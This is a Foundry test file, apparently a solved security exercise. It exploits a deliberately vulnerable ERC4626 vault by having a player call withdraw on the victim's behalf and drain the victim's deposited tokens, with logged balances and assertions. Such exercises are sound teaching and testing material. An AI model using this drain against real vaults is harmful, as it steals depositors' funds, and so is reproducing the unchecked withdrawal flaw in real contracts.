// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";
import "forge-std/console.sol";
import "../../src/ERC4626-v1/VulnerableVault.sol";
import "@openzeppelin/contracts/token/ERC20/ERC20.sol";
import "@openzeppelin/contracts/token/ERC20/utils/SafeERC20.sol";
using SafeERC20 for IERC20;

contract MockERC20 is ERC20 {
    constructor(string memory name, string memory symbol) ERC20(name, symbol) {
        _mint(msg.sender, 1000000 * 10**decimals());
    }
}

contract VaultExploit is Test {
    VulnerableVault public vault;
    MockERC20 public token;
    address public player;
    address public victim;
    
    // added
    uint256 initialPlayerBalance = 1000 * 10**18;  // Player starts with 1,000 tokens
    uint256 victimDeposit = 10000 * 10**18;  // Victim deposited 10,000 tokens into the vault


    function setUp() public {
        token = new MockERC20("TestToken", "TTKN");
        vault = new VulnerableVault(IERC20(address(token)));
        
        player = makeAddr("player");
        victim = makeAddr("victim");

        // Give some tokens to the player and victim
        token.transfer(player, 1000 * 10**token.decimals());
        token.transfer(victim, 10000 * 10**token.decimals());

        // Victim deposits into the vault
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(10000 * 10**token.decimals(), victim);
        vm.stopPrank();
    }

    function testExploit() public {
        vm.startPrank(player);

        // TODO: Exploit the vault here
        // Hint: The vulnerability is in the deposit and withdraw functions
        // Your goal is to drain the victim's funds from the vault

        // strategy:
        // Step 1: Deposit a small amount to receive vault shares
        // Step 2: Inflate the vault's shares-to-assets ratio by withdrawing victim's funds
        // Step 3: Check that the player has more than 10,000 tokens


        // logs
        console.log("player initial token balance", token.balanceOf(player));
        console.log("vault initial token balance", token.balanceOf(address(vault)));
        console.log("victim initial token balance", token.balanceOf(victim));


        //step 1
        uint256 playerDeposit = 1 * 10**18;  // 1 * 1e18
        token.approve(address(vault), playerDeposit);
        vault.deposit(playerDeposit, player); // player deposited 1 token

        //logs
        console.log("player token balance after deposit", token.balanceOf(player));
        console.log("Vault balance after player's deposit:", token.balanceOf(address(vault)));



        //step 2
        vault.withdraw(victimDeposit, player, victim); //withdraw victim tokens

        //logs
        console.log("player balance after exploiting", token.balanceOf(player));
        console.log("Vault balance after exploiting:", token.balanceOf(address(vault))); 


        // vault
        // 10000000000000000000000  --> initial
        // 10001000000000000000000  --> after deposit
        // 1000000000000000000      --> after exploit


        // player 
        // 1000000000000000000000   --> initial
        // 999000000000000000000    --> after deposit
        // 10999000000000000000000  --> after exploit

        vm.stopPrank();
        
        //step 3
        // Check if the exploit was successful
        assertGt(token.balanceOf(player), 10000 * 10**token.decimals(), "Player should have more than 10000 tokens");
        assertLt(token.balanceOf(address(vault)), 1000 * 10**token.decimals(), "Vault should have less than 1000 tokens left");
    }
}